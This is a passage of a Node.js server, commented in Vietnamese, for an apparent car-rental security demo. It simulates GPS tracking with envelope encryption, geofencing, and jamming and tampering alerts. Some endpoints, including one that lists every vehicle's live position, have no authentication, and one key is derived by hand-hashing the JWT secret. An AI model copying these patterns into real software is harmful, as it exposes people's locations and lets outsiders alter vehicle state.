    HCMC_ROUTE = await fetchOSRMRoute(BASE_HCMC_ROUTE); await delay(500);
    HAIPHONG_ROUTE = await fetchOSRMRoute(BASE_HAIPHONG_ROUTE); await delay(500);
    NHATRANG_ROUTE = await fetchOSRMRoute(BASE_NHATRANG_ROUTE); await delay(500);
    CANTHO_ROUTE = await fetchOSRMRoute(BASE_CANTHO_ROUTE);
    console.log(`[GPS] Đã tải xong 10 tuyến đường! Tốc độ load OSRM hoàn hảo.`);
}

// Gọi khởi tạo ngay và chỉ kích hoạt xe sau khi đã tải xong bản đồ
initRoutesWithOSRM().then(() => {
    console.log('[GPS] Tuyến đường đã sẵn sàng. Khôi phục các xe đang hoạt động...');
    db.all(`SELECT * FROM Rentals WHERE Status = 'Active'`, (err, rentals) => {
        if (!rentals) return;
        rentals.forEach(r => { 
            if (!gpsState[r.VehicleID]) {
                db.get(`SELECT * FROM VehicleGPS WHERE VehicleID = ?`, [r.VehicleID], (err, gps) => {
                    initGpsSession(r.VehicleID, r.AccountID, r.RouteType || 'hanoi', gps);
                });
            }
        });
        if (rentals.length) console.log(`[V3-GPS] Khôi phục thành công ${rentals.length} phiên GPS đang chạy (Persistence).`);
    });
});

// Hàm lấy địa chỉ từ Tọa độ (Reverse Geocoding qua Nominatim OSM)
function reverseGeocode(lat, lon) {
    const https = require('https');
    return new Promise((resolve) => {
        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
        https.get(url, { headers: { 'User-Agent': 'AntigravityCarRentalDemo/1.0' } }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const parsed = JSON.parse(data);
                    if (parsed && parsed.display_name) {
                        resolve(parsed.display_name);
                    } else {
                        resolve('Không xác định được địa chỉ');
                    }
                } catch (e) {
                    resolve('Lỗi phân tích địa chỉ');
                }
            });
        }).on('error', () => resolve('Lỗi kết nối API địa chỉ'));
    });
}

// Gửi SSE event cho các client đang kết nối tới vehicleId
function sendGpsSSE(vehicleId, eventType, data) {
    const s = gpsState[vehicleId];
    if (s && s.clients) {
        if (eventType === 'report') {
            db.get(`SELECT OwnerID FROM Vehicles WHERE VehicleID = ?`, [vehicleId], (err, vehicleRow) => {
                const ownerId = vehicleRow ? vehicleRow.OwnerID : null;
                s.clients.forEach(client => {
                    const clientAccountId = client.user ? client.user.AccountID : null;
                    if (clientAccountId === 1 || (ownerId && clientAccountId === ownerId)) {
                        client.write(`event: ${eventType}\ndata: ${JSON.stringify(data)}\n\n`);
                    }
                });
            });
        } else {
            s.clients.forEach(client => {
                client.write(`event: ${eventType}\ndata: ${JSON.stringify(data)}\n\n`);
            });
        }
    }
}

// Gửi báo cáo định kỳ 1 giờ (Mô phỏng: gửi mỗi 30 giây trên demo để dễ kiểm tra trên frontend)
setInterval(async () => {
    console.log('[SYSTEM] Bắt đầu tạo báo cáo GPS định kỳ 1 giờ...');
    
    // Thu thập địa chỉ cho tất cả các xe đang hoạt động
    for (const vehicleId in gpsState) {
        const s = gpsState[vehicleId];
        if (!s || s.isTampered) continue; // Bỏ qua xe bị vô hiệu hóa
        
        // Gọi API lấy Tên đường, phường xã
        const address = await reverseGeocode(s.lat, s.lon);
        
        db.get(`SELECT OwnerID FROM Vehicles WHERE VehicleID = ?`, [vehicleId], (err, vehicleRow) => {
            const ownerId = vehicleRow ? vehicleRow.OwnerID : null;
            
            const queryOwner = ownerId 
                ? `SELECT FullName FROM Accounts WHERE AccountID = ?` 
                : null;
                
            db.get(queryOwner || `SELECT 'Hệ thống' AS FullName`, ownerId ? [ownerId] : [], (err, ownerRow) => {
                const ownerName = ownerRow ? ownerRow.FullName : 'Hệ thống';
                
                db.get(`SELECT FullName FROM Accounts WHERE AccountID = ?`, [s.accountId], (err, driverRow) => {
                    const driverName = driverRow ? driverRow.FullName : 'Không rõ';
                    
                    const reportMsg = `📍 BÁO CÁO HÀNH TRÌNH TỔNG HỢP (1 GIỜ) - XE #${vehicleId}:
- Chủ xe: ${ownerName}
- Người lái: ${driverName}
- Vị trí hiện tại: ${address}
- Tọa độ: (${s.lat.toFixed(6)}, ${s.lon.toFixed(6)})
- Tốc độ trung bình: ${Math.round(s.speed)} km/h
- Trạng thái an ninh: Ổn định (Chống phá sóng hoạt động tốt)`;

                    const report = {
                        type: 'periodic_report',
                        vehicleId: parseInt(vehicleId),
                        message: reportMsg,
                        timestamp: new Date().toISOString()
                    };
                    
                    // Gửi qua SSE
                    sendGpsSSE(vehicleId, 'report', report);
                });
            });
        });
    }
}, 30000); // 30 giây gửi 1 lần (mô phỏng báo cáo 1 giờ)

/** Tính góc phương vị (bearing) từ điểm 1 → điểm 2 */
function calcBearing(lat1, lon1, lat2, lon2) {
    const dLon = (lon2 - lon1) * Math.PI / 180;
    const y = Math.sin(dLon) * Math.cos(lat2 * Math.PI / 180);
    const x = Math.cos(lat1 * Math.PI / 180) * Math.sin(lat2 * Math.PI / 180)
             - Math.sin(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.cos(dLon);
    return (Math.atan2(y, x) * 180 / Math.PI + 360) % 360;
}

/** Khởi động phiên GPS bảo mật cho xe khi được thuê */
async function initGpsSession(vehicleId, accountId, routeType = 'hanoi', restoreGps = null) {
    if (gpsState[vehicleId] && !gpsState[vehicleId].isTampered) return;

    // Check if there is an active rental for this vehicle (chỉ lái xe khi có tài khoản đăng ký lái)
    const activeRental = await new Promise((resolve) => {
        db.get(`SELECT AccountID, RouteType FROM Rentals WHERE VehicleID = ? AND Status = 'Active'`, [vehicleId], (err, row) => {
            resolve(row);
        });
    });

    if (!activeRental) {
        console.log(`[V3-GPS] Xe #${vehicleId} không có tài khoản đăng ký lái (hợp đồng hoạt động). Không cho phép di chuyển.`);
        return;
    }

    // Assign unique route types to all 10 cars
    let finalRouteType = routeType;
    if (activeRental.RouteType && activeRental.RouteType !== 'hanoi') {
        finalRouteType = activeRental.RouteType;
    }
    if (finalRouteType === 'hanoi') {
        finalRouteType = getDefaultRouteForVehicle(vehicleId).type;
    }
    routeType = finalRouteType;

    // Sinh DEK (Data Encryption Key) ngẫu nhiên cho phiên này
    const dek = crypto.randomBytes(32);

    // Bọc DEK bằng RSA Public Key của server (Envelope Encryption)
    const dekWrappedForServer = crypto.publicEncrypt(
        { key: publicKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256' },
        dek
    ).toString('base64');

    let route = HANOI_ROUTE;
    if (routeType === 'north_vietnam') route = NORTH_VIETNAM_ROUTE;
    else if (routeType === 'airport') route = AIRPORT_ROUTE;
    else if (routeType === 'west') route = WEST_ROUTE;
    else if (routeType === 'east') route = EAST_ROUTE;
    else if (routeType === 'danang') route = DANANG_ROUTE;
    else if (routeType === 'hcmc') route = HCMC_ROUTE;
    else if (routeType === 'haiphong') route = HAIPHONG_ROUTE;
    else if (routeType === 'nhatrang') route = NHATRANG_ROUTE;
    else if (routeType === 'cantho') route = CANTHO_ROUTE;

    let routeIndex = 0;
    if (restoreGps && restoreGps.Lat && restoreGps.Lon) {
        // Tái tạo lại vị trí bằng cách tìm điểm gần nhất trên lộ trình đúng vùng
        let minDist = 9999;
        for (let i = 0; i < route.length; i++) {
            let d = haversineKm(restoreGps.Lat, restoreGps.Lon, route[i].lat, route[i].lon);
            if (d < minDist) { minDist = d; routeIndex = i; }
        }
    } else {
        // Chọn điểm xuất phút ngẫu nhiên trên lộ trình đúng vùng có sẵn
        routeIndex = Math.floor(Math.random() * route.length);
    }
    
    if (!route || route.length < 2) {
        route = HANOI_ROUTE;
        routeIndex = 0;
    }

    const startPt = route[routeIndex];
    const nextIndex = (routeIndex + 1) % route.length;

    let initialSpeed = (routeType === 'airport' || routeType === 'north_vietnam') ? 80 : 40;
    let initialMode = 'GPS';
    let isLockedInitial = false;

    if (wipedBluetoothVehicles.has(parseInt(vehicleId))) {
        initialSpeed = 0;
        initialMode = 'OFFLINE';
    } else if (restoreGps) {
        initialSpeed = restoreGps.Speed !== undefined ? restoreGps.Speed : initialSpeed;
        initialMode = restoreGps.Mode || 'GPS';
        if (restoreGps.Mode === 'LOCKED') {
            isLockedInitial = true;
        }
    } else {
        // New rental starting - clear previous wiped state if any
        wipedBluetoothVehicles.delete(parseInt(vehicleId));
    }

    gpsState[vehicleId] = {
        vehicleId: parseInt(vehicleId), accountId,
        lat: startPt.lat, lon: startPt.lon,
        speed: initialSpeed,
        targetSpeed: initialSpeed,
        heading: calcBearing(startPt.lat, startPt.lon, route[nextIndex].lat, route[nextIndex].lon),
        dek, dekWrappedForServer,
        routeIndex: routeIndex,
        routeType: routeType,
        route: route,
        isLocked: isLockedInitial, isTampered: false,
        mode: initialMode,
        geofence: { lat: route[0].lat, lon: route[0].lon, radiusKm: 5.0 }, // Dynamic geofence using route start point
        geofenceViolating: false, lastAlertTime: 0,
        path: [{ lat: startPt.lat, lon: startPt.lon, ts: Date.now() }],
        clients: new Set(),
        intervalId: null
    };

    // Kiểm tra trạng thái khóa từ cơ sở dữ liệu để cập nhật và khởi chạy định vị
    db.get(`SELECT Status FROM Vehicles WHERE VehicleID = ?`, [vehicleId], (err, row) => {
        if (gpsState[vehicleId]) {
            if (row && row.Status === 'Locked') {
                gpsState[vehicleId].isLocked = true;
                gpsState[vehicleId].speed = 0;
                gpsState[vehicleId].targetSpeed = 0;
                gpsState[vehicleId].mode = 'LOCKED';
                console.log(`[V3-GPS] Xe #${vehicleId} khởi tạo ở trạng thái KHÓA từ CSDL.`);
            }
            startGpsLoop(vehicleId);
            console.log(`[V3-GPS] Khởi động phiên xe #${vehicleId} | DEK: AES-256-GCM | Bọc: RSA-OAEP-SHA256`);
        }
    });
}

function encryptGpsCoords(vehicleId, lat, lon, speed, heading) {
    const s = gpsState[vehicleId];
    if (!s || !s.dek) return null;
    const plain = JSON.stringify({ lat, lon, speed, heading, ts: Date.now() });
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', s.dek, iv);
    let ct = cipher.update(plain, 'utf8', 'hex');
    ct += cipher.final('hex');
    return { iv: iv.toString('hex'), authTag: cipher.getAuthTag().toString('hex'), ciphertext: ct };
}

/** Tính khoảng cách Haversine (km) giữa 2 tọa độ */
function haversineKm(lat1, lon1, lat2, lon2) {
    const R = 6371, dLat = (lat2 - lat1) * Math.PI / 180, dLon = (lon2 - lon1) * Math.PI / 180;
    const a = Math.sin(dLat/2)**2 + Math.cos(lat1*Math.PI/180)*Math.cos(lat2*Math.PI/180)*Math.sin(dLon/2)**2;
    return 2 * R * Math.asin(Math.sqrt(a));
}

function getNearestLocationName(routeType, lat, lon) {
    let base = BASE_HANOI_ROUTE;
    if (routeType === 'airport') base = BASE_AIRPORT_ROUTE;
    else if (routeType === 'north_vietnam') base = BASE_NORTH_ROUTE;
    else if (routeType === 'west') base = BASE_WEST_ROUTE;
    else if (routeType === 'east') base = BASE_EAST_ROUTE;
    else if (routeType === 'danang') base = BASE_DANANG_ROUTE;
    else if (routeType === 'hcmc') base = BASE_HCMC_ROUTE;
    else if (routeType === 'haiphong') base = BASE_HAIPHONG_ROUTE;
    else if (routeType === 'nhatrang') base = BASE_NHATRANG_ROUTE;
    else if (routeType === 'cantho') base = BASE_CANTHO_ROUTE;

    let nearest = base[0];
    let minDist = 9999;
    for (let wp of base) {
        let d = haversineKm(lat, lon, wp.lat, wp.lon);
        if (d < minDist) { minDist = d; nearest = wp; }
    }
    return `Đang gần ${nearest.name}`;
}

/** Đẩy sự kiện SSE tới tất cả client đang kết nối */
function pushSSE(vehicleId, data) {
    const s = gpsState[vehicleId];
    if (!s) return;
    const payload = `data: ${JSON.stringify(data)}\n\n`;
    const dead = [];
    s.clients.forEach(r => { try { r.write(payload); } catch { dead.push(r); } });
    dead.forEach(r => s.clients.delete(r));
}

/** Giả lập BSSID Wi-Fi từ tọa độ (Wi-Fi Fingerprinting) */
function generateWifiBssids(lat, lon) {
    const h = Math.floor(lat * 10000) % 256, v = Math.floor(lon * 10000) % 256;
    return [
        `${h.toString(16).padStart(2,'0')}:${v.toString(16).padStart(2,'0')}:C3:F1:2A:01`,
        `${((h+7)%256).toString(16).padStart(2,'0')}:${((v+13)%256).toString(16).padStart(2,'0')}:D4:E8:9B:22`,
        `${((h+15)%256).toString(16).padStart(2,'0')}:${((v+27)%256).toString(16).padStart(2,'0')}:A1:5C:3F:44`
    ];
}

/** Vòng lặp GPS – cập nhật vị trí mỗi 3 giây, kiểm tra Geofence */
function startGpsLoop(vehicleId) {
    const s = gpsState[vehicleId];
    if (!s || s.intervalId) return;

    s.intervalId = setInterval(() => {
        const st = gpsState[vehicleId];
        if (!st || st.isTampered) {
            if (st?.intervalId) { clearInterval(st.intervalId); st.intervalId = null; }
            return;
        }

        db.get(`SELECT ActiveBluetoothDevice FROM VehicleInfotainment WHERE VehicleID = ?`, [vehicleId], (err, infoRow) => {
            const st = gpsState[vehicleId];
            if (!st || st.isTampered) return;

            const btDevice = infoRow?.ActiveBluetoothDevice || '';
            const isBtOffline = !btDevice || /offline|ngắt|ngat|không|khong|chưa|chua|off|vô chủ|vo chu|ngắt kết nối/i.test(btDevice);

            if (st.isLocked || isBtOffline) {
                st.speed = 0;
                st.targetSpeed = 0;
                const encrypted = encryptGpsCoords(vehicleId, st.lat, st.lon, 0, st.heading);
                const mode = st.isLocked ? 'LOCKED' : 'OFFLINE';
                st.mode = mode;
                
                db.run(`UPDATE VehicleGPS SET Lat=?, Lon=?, Speed=?, Heading=?, Mode=?, Timestamp=? WHERE VehicleID=?`,
                    [+st.lat.toFixed(6), +st.lon.toFixed(6), 0, +st.heading.toFixed(1), mode, new Date().toISOString(), vehicleId]);

                pushSSE(vehicleId, {
                    type: 'GPS',
                    vehicleId: st.vehicleId,
                    encrypted,
                    dekWrappedForServer: st.dekWrappedForServer,
                    lat: st.lat,
                    lon: st.lon,
                    speed: 0,
                    heading: st.heading,
                    mode,
                    outsideGeofence: st.geofenceViolating,
                    distanceFromCenter: haversineKm(st.geofence.lat, st.geofence.lon, st.lat, st.lon),
                    geofence: st.geofence,
                    pathPoints: st.path.slice(-25),
                    currentWaypoint: st.isLocked ? 'Động cơ bị khóa' : 'Hộp đen ngoại tuyến',
                    nextWaypoint: '',
                    isLocked: st.isLocked,
                    ts: Date.now(),
                    note: st.isLocked 
                        ? 'Động cơ bị khóa từ xa — Thiết bị vẫn hoạt động nhưng vận tốc = 0'
                        : 'Hộp đen ngoại tuyến (ActiveBluetoothDevice Offline) — Vận tốc = 0'
                });
                return;
            }

            let eventData;

            let route = st.route || HANOI_ROUTE;
            if (st.routeType === 'airport') route = AIRPORT_ROUTE;
            else if (st.routeType === 'north_vietnam') route = NORTH_VIETNAM_ROUTE;
            else if (st.routeType === 'west') route = WEST_ROUTE;
            else if (st.routeType === 'east') route = EAST_ROUTE;
            else if (st.routeType === 'danang') route = DANANG_ROUTE;
            else if (st.routeType === 'hcmc') route = HCMC_ROUTE;
            else if (st.routeType === 'haiphong') route = HAIPHONG_ROUTE;
            else if (st.routeType === 'nhatrang') route = NHATRANG_ROUTE;
            else if (st.routeType === 'cantho') route = CANTHO_ROUTE;
            let speedMultiplier = 1;

            // ── ROUTE-FOLLOWING GPS MODE ──
            const dt = 3; // giây mỗi tick
            const targetBase = (st.routeType === 'north_vietnam' || st.routeType === 'airport') ? 80 : 40;
            
            if (!st.targetSpeed || Math.abs(st.speed - st.targetSpeed) < 3) {
                st.targetSpeed = targetBase + (Math.random() * 15 - 5);
            }
            
            if (st.speed < st.targetSpeed) st.speed += Math.random() * 2 + 0.5;
            else if (st.speed > st.targetSpeed) st.speed -= Math.random() * 2 + 0.5;
            
            const distKm = (st.speed / 3600) * dt * speedMultiplier;

            if (!route || route.length < 2) route = HANOI_ROUTE;
            st.routeIndex = Math.max(0, Math.min(st.routeIndex || 0, route.length - 1));
            let remainingKm = distKm;
            let guard = 0;
            while (remainingKm > 0 && guard++ < 20) {
                const targetIndex = st.isReversing
                    ? (st.routeIndex - 1 + route.length) % route.length
                    : (st.routeIndex + 1) % route.length;
                const targetWp = route[targetIndex];
                const distToWp = haversineKm(st.lat, st.lon, targetWp.lat, targetWp.lon);
                if (distToWp <= Math.max(remainingKm, 0.001)) {
                    st.routeIndex = targetIndex;
                    st.lat = targetWp.lat;
                    st.lon = targetWp.lon;
                    remainingKm -= distToWp;
                } else {
                    const ratio = remainingKm / distToWp;
                    st.lat = st.lat + (targetWp.lat - st.lat) * ratio;
                    st.lon = st.lon + (targetWp.lon - st.lon) * ratio;
                    remainingKm = 0;
                }
            }
            const headingTargetIndex = st.isReversing
                ? (st.routeIndex - 1 + route.length) % route.length
                : (st.routeIndex + 1) % route.length;
            const headingTarget = route[headingTargetIndex] || route[0];
            st.heading = calcBearing(st.lat, st.lon, headingTarget.lat, headingTarget.lon);

            const currentWp = route[st.routeIndex] || route[0];
            st.path.push({ lat: st.lat, lon: st.lon, ts: Date.now() });
            if (st.path.length > 60) st.path.shift();

            const encrypted = encryptGpsCoords(vehicleId, st.lat, st.lon, st.speed, st.heading);
            const dist = haversineKm(st.geofence.lat, st.geofence.lon, st.lat, st.lon);
            const outside = dist > st.geofence.radiusKm;

            if (outside && !st.geofenceViolating) {
                st.geofenceViolating = true;
                const now = Date.now();
                if (now - st.lastAlertTime > 20000) {
                    st.lastAlertTime = now;
                    db.run(`INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)`,
                        [vehicleId, st.accountId, 'GEOFENCE_VIOLATION',
                         `Xe #${vehicleId} vượt vùng an toàn ${st.geofence.radiusKm}km! Khoảng cách: ${dist.toFixed(2)}km | Tọa độ: (${st.lat.toFixed(5)}, ${st.lon.toFixed(5)})`,
                         'HIGH']);
                }
            } else if (!outside) st.geofenceViolating = false;

            const locName = getNearestLocationName(st.routeType, st.lat, st.lon);
            st.mode = 'GPS';

            db.run(`UPDATE VehicleGPS SET Lat=?, Lon=?, Speed=?, Heading=?, Mode=?, Timestamp=?, Address=?, LastReported='Vừa xong' WHERE VehicleID=?`,
                [+st.lat.toFixed(6), +st.lon.toFixed(6), +st.speed.toFixed(1), +st.heading.toFixed(1), 'GPS', new Date().toISOString(), locName, vehicleId]);

            if (st.tripLimit && st.tripLimit.enabled) {
                const now = Date.now();
                const tripDistKm = haversineKm(st.tripLimit.fromLat, st.tripLimit.fromLon, st.lat, st.lon);
                const tripOutsideRadius = tripDistKm > st.tripLimit.radiusKm;
                const tripTimeExpired = now > st.tripLimit.endsAt;
                const remainingMs = Math.max(0, st.tripLimit.endsAt - now);
                const remainingMin = Math.ceil(remainingMs / 60000);
                
                if ((tripOutsideRadius || tripTimeExpired) && !st.tripLimit.violated) {
                    st.tripLimit.violated = true;
                }
                
                if (st.tripLimit.violated && (now - st.tripLimit.lastTripAlertTime > 30000)) {
                    st.tripLimit.lastTripAlertTime = now;
                    const reason = tripTimeExpired 
                        ? `⏰ Hết thời gian hành trình (${st.tripLimit.limitMinutes} phút)`
                        : `📍 Vượt bán kính cho phép ${st.tripLimit.radiusKm}km (cách điểm xuất phát ${tripDistKm.toFixed(2)}km)`;
                    db.run(`INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)`,
                        [vehicleId, st.accountId, 'GEOFENCE_VIOLATION',
                         `🚨 TRIP VIOLATION - Xe #${vehicleId}: ${reason} | Từ "${st.tripLimit.fromName}" → "${st.tripLimit.toName}"`,
                         'CRITICAL']);
                }

                eventData = {
                    type: 'GPS', vehicleId: st.vehicleId,
                    encrypted, dekWrappedForServer: st.dekWrappedForServer,
                    lat: st.lat, lon: st.lon, speed: st.speed, heading: st.heading,
                    outsideGeofence: outside, distanceFromCenter: dist,
                    geofence: st.geofence, pathPoints: st.path.slice(-25),
                    currentWaypoint: currentWp?.name || 'Trên đường',
                    nextWaypoint: (route[(st.routeIndex + 1) % route.length])?.name || '',
                    routeIndex: st.routeIndex, routeTotal: route.length - 1,
                    routeProgress: (route.length > 1 ? st.routeIndex / (route.length - 1) : 0),
                    routeType: st.routeType,
                    tripLimit: {
                        enabled: true,
                        fromName: st.tripLimit.fromName,
                        toName: st.tripLimit.toName,
                        radiusKm: st.tripLimit.radiusKm,
                        limitMinutes: st.tripLimit.limitMinutes,
                        remainingMin,
                        tripDistKm: +tripDistKm.toFixed(2),
                        violated: st.tripLimit.violated,
                        tripTimeExpired,
                        tripOutsideRadius
                    },
                    ts: Date.now()
                };
            } else {
                eventData = {
                    type: 'GPS', vehicleId: st.vehicleId,
                    encrypted, dekWrappedForServer: st.dekWrappedForServer,
                    lat: st.lat, lon: st.lon, speed: st.speed, heading: st.heading,
                    outsideGeofence: outside, distanceFromCenter: dist,
                    geofence: st.geofence, pathPoints: st.path.slice(-25),
                    currentWaypoint: currentWp?.name || 'Trên đường',
                    nextWaypoint: (route[(st.routeIndex + 1) % route.length])?.name || '',
                    routeIndex: st.routeIndex,
                    routeTotal: route.length - 1,
                    routeProgress: (route.length > 1 ? st.routeIndex / (route.length - 1) : 0),
                    routeType: st.routeType,
                    ts: Date.now()
                };
            }

            pushSSE(vehicleId, eventData);
        });
    }, 3000);
}

/** Kết thúc phiên GPS: dừng loop, Zeroize DEK */
function terminateGpsSession(vehicleId) {
    const s = gpsState[vehicleId];
    if (s) {
        if (s.intervalId) clearInterval(s.intervalId);
        pushSSE(vehicleId, { type: 'SESSION_ENDED', vehicleId });
        if (s.dek) s.dek.fill(0); // ZEROIZE DEK
        delete gpsState[vehicleId];
    }
    
    // Ngừng xe ngay lập tức, chuyển tốc độ về 0, đánh dấu offline
    db.run(`UPDATE VehicleGPS SET Mode = 'OFFLINE', Speed = 0, LastReported = 'Đã tắt thiết bị' WHERE VehicleID = ?`, [vehicleId]);
    
    // Chuyển hộp đen về ngắt kết nối
    db.run(`UPDATE VehicleInfotainment SET ActiveBluetoothDevice = 'Ngắt kết nối (Offline)' WHERE VehicleID = ?`, [vehicleId]);
    
    console.log(`[V3-GPS] Kết thúc phiên xe #${vehicleId} — Hộp đen về Ngắt kết nối (Offline) & Động cơ dừng.`);
}



// ── V3 API: SSE GPS Stream ──────────────────────────────────────
app.get('/api/v2/vehicles/gps-stream/:vehicleId', verifyTokenV2, async (req, res) => {
    const vehicleId = parseInt(req.params.vehicleId);
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('X-Accel-Buffering', 'no');
    res.flushHeaders();

    if (!gpsState[vehicleId]) await initGpsSession(vehicleId, req.user.AccountID);
    const s = gpsState[vehicleId];
    if (!s) return res.end();
    res.user = req.user;
    s.clients.add(res);

    // Gửi trạng thái ban đầu ngay lập tức
    res.write(`data: ${JSON.stringify({
        type: 'INIT', vehicleId,
        lat: s.lat, lon: s.lon, speed: s.speed, heading: s.heading,
        geofence: s.geofence, pathPoints: s.path,
        isLocked: s.isLocked, isTampered: s.isTampered,
        encryptionInfo: { algorithm: 'AES-256-GCM', dek: 'RSA-OAEP-SHA256', active: true }
    })}\n\n`);

    req.on('close', () => { if (gpsState[vehicleId]) gpsState[vehicleId].clients.delete(res); });
});

// ── V3 API: Cập nhật luồng GPS ────────────────────────────────────────
app.get('/api/v2/vehicles/active-gps', (req, res) => {
    const data = Object.values(gpsState).map(s => ({
        vehicleId: s.vehicleId,
        lat: +s.lat.toFixed(5),
        lon: +s.lon.toFixed(5),
        speed: +s.speed.toFixed(1),
        heading: +s.heading.toFixed(1),
        isLocked: s.isLocked,
        isTampered: s.isTampered,
        geofenceViolating: s.geofenceViolating,
        clientCount: s.clients.size,
        geofence: s.geofence,
        routeType: s.routeType || 'hanoi'
    }));
    res.json(data);
});

// ── V3 API: Lấy trạng thái GPS hiện tại ─────────────────────────
app.get('/api/v2/vehicles/gps-current', verifyTokenV2, (req, res) => {
    db.get(`SELECT VehicleID FROM Rentals WHERE AccountID = ? AND Status = 'Active' LIMIT 1`,
        [req.user.AccountID], (err, rental) => {
        if (err || !rental) return res.status(404).json({ error: 'Không có xe đang thuê.' });
        const vid = rental.VehicleID;
        if (!gpsState[vid]) initGpsSession(vid, req.user.AccountID);
        const s = gpsState[vid];
        res.json({
            vehicleId: vid, lat: s.lat, lon: s.lon, speed: s.speed, heading: s.heading,
            isLocked: s.isLocked, isTampered: s.isTampered,
            geofence: s.geofence, geofenceViolating: s.geofenceViolating,
            pathPoints: s.path.slice(-30),
            envelopeEncryption: { algorithm: 'AES-256-GCM', dekWrapped: 'RSA-OAEP-SHA256', active: !s.isTampered }
        });
    });
});

// ── V3 API: Cấp DEK đã bọc cho client giải mã GPS ───────────────
app.get('/api/v2/vehicles/gps-dek', verifyTokenV2, (req, res) => {
    db.get(`SELECT VehicleID FROM Rentals WHERE AccountID = ? AND Status = 'Active' LIMIT 1`,
        [req.user.AccountID], (err, rental) => {
        if (err || !rental) return res.status(404).json({ error: 'Không có xe đang thuê.' });
        const s = gpsState[rental.VehicleID];
        if (!s || !s.dek) return res.status(404).json({ error: 'Phiên GPS chưa sẵn sàng.' });

        // Bọc DEK bằng khóa phiên của user (HKDF-like)
        const sessionKey = crypto.createHash('sha256')
            .update(JWT_SECRET + req.user.AccountID + rental.VehicleID).digest();
        const iv = crypto.randomBytes(12);
        const cipher = crypto.createCipheriv('aes-256-gcm', sessionKey, iv);
        let enc = cipher.update(s.dek.toString('hex'), 'utf8', 'hex');
        enc += cipher.final('hex');
        res.json({
            vehicleId: rental.VehicleID, encryptedDek: enc,
            iv: iv.toString('hex'), authTag: cipher.getAuthTag().toString('hex'),
            note: 'DEK bọc bằng khóa phiên cá nhân — Envelope Encryption đa người nhận'
        });
    });
});

// ── V3 API: Đặt vùng địa lý an toàn (Geofence) ─────────────────
app.post('/api/v2/vehicles/set-geofence', verifyTokenV2, (req, res) => {
    const { vehicleId, radiusKm } = req.body;

    db.get(`SELECT OwnerID FROM Vehicles WHERE VehicleID = ?`, [vehicleId], (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!row) return res.status(404).json({ error: 'Vehicle not found.' });

        if (req.user.AccountID !== 1 && req.user.AccountID !== row.OwnerID) {
            return res.status(403).json({ error: 'Forbidden: Bạn không phải chủ sở hữu xe này.' });
        }

        setGeofenceLogic();
    });

    function setGeofenceLogic() {
        const s = gpsState[vehicleId];
        if (!s) return res.status(404).json({ error: 'Phiên GPS xe không hoạt động.' });
        s.geofence = { lat: s.lat, lon: s.lon, radiusKm: Math.max(0.5, Math.min(50, parseFloat(radiusKm) || 5)) };
        s.geofenceViolating = false;
        db.run(`INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)`,
            [vehicleId, s.accountId, 'GEOFENCE_SET',
             `Cập nhật vùng an toàn xe #${vehicleId}: ${s.geofence.radiusKm}km từ (${s.lat.toFixed(5)}, ${s.lon.toFixed(5)})`, 'INFO']);
        res.json({ message: `Vùng an toàn cập nhật: ${s.geofence.radiusKm}km từ vị trí hiện tại`, geofence: s.geofence });
    }
});

// ── V3 API: Giả lập nhiễu GPS (GPS Jamming V1/V2) ─────────────────────
app.post('/api/v2/vehicles/simulate-jamming', (req, res) => {
    const { vehicleId, enable, version } = req.body;
    const s = gpsState[vehicleId];
    if (!s) return res.status(404).json({ error: 'Phiên GPS không hoạt động.' });
    
    if (enable === false) {
        s.isJammed = false;
        s.isJammedV1 = false;
        s.mode = 'GPS';
        const msg = '[PHỤC HỒI] Tín hiệu GPS xe #' + vehicleId + ' đã bình thường trở lại. Chế độ định vị vệ tinh GPS hoạt động.';
        db.run('INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)',
            [vehicleId, s.accountId, 'GPS_JAMMING', msg, 'INFO']);
        pushSSE(vehicleId, { type: 'MODE_CHANGE', mode: s.mode, isJammed: false, isJammedV1: false, ts: Date.now() });
        return res.json({ isJammed: false, isJammedV1: false, mode: s.mode, message: msg });
    }
    
    if (parseInt(version) === 1) {
        s.isJammedV1 = true;
        s.isJammed = false;
        s.mode = 'LOST_GPS';
        const msg = '[🚨 CẢNH BÁO] Phát hiện nhiễu GPS xe #' + vehicleId + '! V1 (Không bảo mật): Xe bị mất định vị hoàn toàn do không có cảm biến hỗ trợ.';
        db.run('INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)',
            [vehicleId, s.accountId, 'GPS_JAMMING', msg, 'HIGH']);
        pushSSE(vehicleId, { type: 'MODE_CHANGE', mode: s.mode, isJammed: false, isJammedV1: true, ts: Date.now() });
        res.json({ isJammed: false, isJammedV1: true, mode: s.mode, message: msg });
    } else {
        s.isJammed = true;
        s.isJammedV1 = false;
        s.mode = 'DEAD_RECKONING';
        s.jammedSince = Date.now();
        const msg = '[CẢNH BÁO] Phát hiện nhiễu GPS xe #' + vehicleId + '! V2 (Có bảo mật): Đang dùng Dead Reckoning + Wi-Fi Fingerprinting để tiếp tục theo dõi an toàn.';
        db.run('INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)',
            [vehicleId, s.accountId, 'GPS_JAMMING', msg, 'MEDIUM']);
        pushSSE(vehicleId, { type: 'MODE_CHANGE', mode: s.mode, isJammed: true, isJammedV1: false, ts: Date.now() });
        res.json({ isJammed: true, isJammedV1: false, mode: s.mode, message: msg });
    }
});

// ── V3 API: Giả lập cạy phá phần cứng + Zeroization ────────────
app.post('/api/v2/vehicles/simulate-tampering', (req, res) => {
    const { vehicleId } = req.body;
    const s = gpsState[vehicleId];
    if (!s) return res.status(404).json({ error: 'Phiên GPS không hoạt động.' });

